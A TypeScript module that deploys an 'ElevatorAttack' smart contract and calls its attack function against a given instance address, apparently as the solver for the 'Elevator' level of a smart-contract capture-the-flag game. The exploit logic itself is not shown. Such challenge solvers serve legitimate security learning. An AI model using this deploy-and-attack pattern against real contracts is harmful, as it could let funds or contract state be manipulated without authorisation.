import { ElevatorAttack } from '../../typechain-types';
import { EthereumClient } from '../ethereum/ethereum-client';
import { Attacker } from './attacker-provider';

export const ELEVATOR_LEVEL_NAME = "Elevator"

export const elevatorAttacker = (): Attacker => {
    return {
        attack: async (ethereum: EthereumClient, instanceAddress: string) => {
            console.log('Deploying ElevatorAttacker.');

            const contract = await ethereum.deployContract<ElevatorAttack>('ElevatorAttack');

            console.log('Attacker deployed at: ', await contract.getAddress(), ' Perfoming the attack');

            const attackTx = await contract.attack(instanceAddress);
            await attackTx.wait();
        }
    }
}